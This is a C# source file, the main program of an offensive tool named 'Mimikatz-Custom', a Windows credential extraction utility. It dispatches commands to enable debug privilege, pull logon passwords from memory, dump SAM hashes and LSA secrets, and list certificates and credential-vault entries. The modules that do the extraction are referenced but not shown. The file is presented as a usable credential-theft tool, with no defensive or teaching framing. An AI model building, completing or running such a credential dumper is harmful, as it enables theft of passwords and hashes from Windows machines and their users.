using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using MimikatzCustom.Modules;

namespace MimikatzCustom
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("╔════════════════════════════════════════════════════════════════════════════════╗");
            Console.WriteLine("║                      Mimikatz-Custom v1.0 (C# Edition)                         ║");
            Console.WriteLine("║                  Windows Credential Extraction Utility                         ║");
            Console.WriteLine("╚════════════════════════════════════════════════════════════════════════════════╝");
            Console.WriteLine();

            if (args.Length == 0)
            {
                PrintHelp();
                return;
            }

            try
            {
                string command = args[0].ToLower();

                switch (command)
                {
                    case "privilege::debug":
                        PrivilegeModule.EnableDebugPrivilege();
                        Console.WriteLine("[+] Debug privilege enabled (if available)");
                        break;

                    case "sekurlsa::logonpasswords":
                        Console.WriteLine("[*] Attempting to extract logon passwords...");
                        SecurlsaModule.ExtractLogonPasswords();
                        break;

                    case "lsadump::sam":
                        Console.WriteLine("[*] Attempting to dump SAM hashes...");
                        LsadumpModule.DumpSAM();
                        break;

                    case "lsadump::secrets":
                        Console.WriteLine("[*] Attempting to dump LSA secrets...");
                        LsadumpModule.DumpSecrets();
                        break;

                    case "crypto::certificates":
                        Console.WriteLine("[*] Enumerating certificates...");
                        CryptoModule.EnumerateCertificates();
                        break;

                    case "vault::list":
                        Console.WriteLine("[*] Listing credential vault entries...");
                        VaultModule.ListVault();
                        break;

                    case "whoami":
                        Console.WriteLine($"[+] Current User: {System.Security.Principal.WindowsIdentity.GetCurrent().Name}");
                        break;

                    case "exit":
                    case "quit":
                        Console.WriteLine("[*] Exiting...");
                        break;

                    default:
                        Console.WriteLine($"[!] Unknown command: {command}");
                        PrintHelp();
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        static void PrintHelp()
        {
            Console.WriteLine();
            Console.WriteLine("Available Commands:");
            Console.WriteLine("==================");
            Console.WriteLine("  privilege::debug           - Enable debug privileges");
            Console.WriteLine("  sekurlsa::logonpasswords   - Extract logon passwords");
            Console.WriteLine("  lsadump::sam               - Dump SAM database");
            Console.WriteLine("  lsadump::secrets           - Dump LSA secrets");
            Console.WriteLine("  crypto::certificates      - List certificates");
            Console.WriteLine("  vault::list                - List credential vault");
            Console.WriteLine("  whoami                     - Show current user");
            Console.WriteLine("  exit/quit                  - Exit program");
            Console.WriteLine();
            Console.WriteLine("Example: mimikatz-Custom.exe sekurlsa::logonpasswords");
        }
    }
}